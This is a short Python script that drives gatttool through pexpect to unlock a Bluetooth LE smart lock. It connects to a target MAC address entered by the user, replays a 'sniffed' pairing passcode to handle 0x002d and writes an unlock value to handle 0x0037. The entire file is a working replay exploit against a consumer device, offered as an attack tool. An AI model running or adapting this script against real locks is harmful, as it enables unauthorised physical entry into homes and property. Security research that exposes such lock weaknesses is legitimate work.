import pexpect
import time

device=raw_input('Enter Target Lock MAC address: ')

# Run Gat Interactively
print("\033[1;33;38m [-]\033[0;37;38m Starting Gattool ....")
child = pexpect.spawn("gatttool -I") # Linux alternative to connect bluetooth devices

# Connect to device
print("\033[1;33;38m [-]\033[0;37;38m Connecting to\033[1;31;38m"),
print(device),
child.sendline("connect {0}".format(device))
child.expect("Connection successful", timeout=5)
print("\n\033[1;32;38m [+]\033[0;37;38m Connected!")

# Connect with sniffed passcode
print("\033[1;32;38m [+]\033[0;37;38m Write privileges successful with sniffed passcode")
child.sendline("char-write-req 0x002d 001234567812345678") #Pairing Pin Code - Interaction With Lock
child.expect("Characteristic value was written successfully", timeout=10)
print("\033[1;32;38m [+]\033[0;37;38m Characteristics 0x002d has been written to Device")

# Send write operation to unlock
print("\033[1;33;38m [-]\033[0;37;38m Sending Write Request 01")
child.sendline("char-write-req 0x0037 01") # Sending a write request to Lock to Open - Interaction 2 with lock 
child.expect("Characteristic value was written successfully", timeout=10)
print("\033[1;32;38m [+]\033[0;37;38m Write Request Successful")
print("\033[1;32;38m [+]\033[0;37;38m Exit hcitool gracefully")
child.expect("\r\n", timeout=10)
